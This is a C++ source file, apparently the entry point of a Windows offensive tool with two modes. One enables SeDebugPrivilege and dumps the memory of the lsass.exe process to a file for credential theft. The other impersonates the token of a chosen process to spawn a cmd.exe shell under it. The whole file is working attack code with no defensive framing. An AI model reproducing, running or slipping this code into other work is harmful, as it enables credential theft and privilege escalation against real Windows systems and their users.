#include <iostream>
#include "DumpLsass.h"
#include "tokenImpersonate.h"

int main(int argc, char* argv[]) {
	//Lsass dumper
	if (argc >= 2)
	{
		const char* argument = argv[1];
		const char* lsass = "lsass";
		const char* TokenImpersonate = "tokenImpersonate";

		if (strcmp(argument, lsass) == 0)
		{
			DumpLsass lsassDumper;
			if (lsassDumper.isElevatedProcess()) {
				printf("We have the required privileges\n");
			}
			else {
				printf("We don't have the required privileges\n");
				return 0;
			}
			wstring processName = L"lsass.exe";
			DWORD processPID = lsassDumper.GetProcessIDByName(processName);
			printf("lsass process PID is %d", processPID);

			if (lsassDumper.setPrivilege()) {
				printf("seDebugPrivilege is enabled\n");
			}
			else {
				printf("seDebugPrivilege is not enabled\n");
				return 0;
			}
			string fileName = "lsass.dump";
			wstring stemp = wstring(fileName.begin(), fileName.end());
			LPCWSTR fileName_pointer = stemp.c_str();
			HANDLE output = CreateFile(fileName_pointer, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			DWORD accessAllow = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
			HANDLE processHandler = OpenProcess(accessAllow, 0, processPID);

			if (processHandler && processHandler != INVALID_HANDLE_VALUE) {
				bool isDump = MiniDumpWriteDump(processHandler, processPID, output, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
				if (isDump) {
					printf("[+] lsass is dumped\n");
				}
				else {
					printf("[-] lsass is not dumped\n");
				}
			}
		}
		if (strcmp(argument, TokenImpersonate) == 0)
		{
			tokenImpersonate impersonation;
			if (impersonation.hasImpersonatePrivilege()) {
				cout << "we have the seImpersonate privilege" << endl;
				list<PProcessInfo>  runningProcesses = impersonation.EnumerateProcesses();
				for (const auto& process : runningProcesses) {
					cout << "Process Name: " << process->Domain_User_Name << " -- PID: " << process->PID << endl;
				}
				int ProcessID;
				cout << "Enter a PID of the process you want to impersonate: "<<endl;
				cin >> ProcessID;

				const wchar_t* processToLaunch = L"cmd.exe";
				wchar_t* nonConstProcessToLaunch = const_cast<wchar_t*>(processToLaunch);
				int spawnedProcessid = impersonation.ImpersonateTokenAndSpawnNewProcess(ProcessID, nonConstProcessToLaunch);
				cout << "Spawned Process ID: " << spawnedProcessid << endl;
			}
			else {
				cout << "we don't have the required privilege" << endl;
				return 0;
			}
		}
		else
		{
			cout << "Unknown argument." << endl;
		}
	}
	else {
		printf("-- pass the lsass as an arguments to dump lsass\n");
		printf("-- pass tokenImpersonate as an arguments to Impersonate a token\n");
	}
	
	
	
}